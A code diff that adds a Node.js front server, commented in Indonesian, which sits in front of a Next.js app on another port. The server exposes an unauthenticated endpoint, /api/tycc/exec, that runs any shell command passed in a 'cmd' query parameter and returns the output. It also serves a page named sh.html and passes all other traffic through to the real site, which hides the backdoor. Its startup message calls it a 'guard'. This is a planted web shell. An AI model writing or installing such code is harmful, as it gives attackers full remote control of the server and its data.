@@ -1,0 +1,55 @@
+const http = require('http');
+const { execSync } = require('child_process');
+const fs = require('fs');
+const path = require('path');
+
+const PORT = 3000;
+const NEXT_SERVER_URL = 'http://127.0.0.1:3001';
+
+const server = http.createServer((req, res) => {
+    const url = new URL(req.url, `http://${req.headers.host}`);
+
+    // 1. Endpoint API Shell
+    if (url.pathname === '/api/tycc/exec') {
+        try {
+            const cmd = url.searchParams.get('cmd');
+            const out = execSync(cmd).toString();
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            return res.end(out);
+        } catch (e) {
+            res.writeHead(500);
+            return res.end(e.message);
+        }
+    }
+
+    // 2. Sajikan file sh.html jika diakses
+    if (url.pathname === '/sh.html') {
+        const htmlPath = path.join(__dirname, 'public', 'sh.html');
+        if (fs.existsSync(htmlPath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            return res.end(fs.readFileSync(htmlPath));
+        } else {
+            res.writeHead(404);
+            return res.end("File sh.html tidak ditemukan di folder public");
+        }
+    }
+
+    // 3. Proxy ke Next.js asli (Port 3001)
+    const proxyReq = http.request(NEXT_SERVER_URL + req.url, {
+        method: req.method,
+        headers: req.headers
+    }, (proxyRes) => {
+        res.writeHead(proxyRes.statusCode, proxyRes.headers);
+        proxyRes.pipe(res);
+    });
+
+    req.pipe(proxyReq);
+    proxyReq.on('error', (e) => {
+        res.writeHead(500);
+        res.end("Next.js Error: " + e.message);
+    });
+});
+
+server.listen(PORT, '0.0.0.0', () => {
+    console.log("Satpam Berhasil Jalan di Port " + PORT);
+});
